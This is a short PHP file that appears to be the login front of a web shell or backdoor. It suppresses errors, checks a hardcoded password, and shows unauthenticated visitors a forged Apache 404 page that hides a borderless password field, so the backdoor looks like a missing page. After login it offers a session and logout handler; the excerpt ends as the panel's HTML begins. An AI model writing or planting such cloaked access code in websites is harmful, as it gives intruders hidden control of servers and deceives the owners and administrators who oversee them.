<?php
error_reporting(0);
session_start();
$auth_pass = "miclave20";

if(!isset($_SESSION["logueadox"])) {
	if(($_POST['pass'] == $auth_pass)) {
		$_SESSION["logueadox"] = true;
	}else{
		panel();
	}
}

function panel() {
	die(" <h1>Not Found</h1>
    <p>The requested URL $_SERVER[HTTP_HOST].$_SERVER[REQUEST_URI] was not found on this server.</p>
    <hr>
    <address>Apache/2.4.12 (Unix) OpenSSL/1.0.1e-fips mod_bwlimited/1.4 Server at $_SERVER[HTTP_HOST] Port 80</address>
        <style>
            input { margin:0;border:1px solid #fff; }
        </style>
	<pre align=center><br><br><br><br><br><br><br><br><br><br><br><form method=post><input type=\"password\" name=\"pass\" size=\"2\" style=\"outline:none; border:none; color: #000;\">
</form></pre>"); }
/*=================================*/
if($_GET["opc"] == "salir") { 
/*=================================*/
session_start();
session_destroy();
$file = basename($_SERVER['PHP_SELF']);
echo "<script type=\"text/javascript\">document.location = \"$file\";</script>"; }
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<script language="JavaScript">
function Salir(){
	var __confirm = confirm("Vuelve Pronto");
	if( !__confirm ){ return false ; }
	window.location = "<?=basename($_SERVER['PHP_SELF']);?>";
}
</script>
</head>
<body>
<a href="?opc=salir" onClick="Salir();" style="float:left;"><font face="Verdana" size="2" color="#E10000">Logout</font></a><br />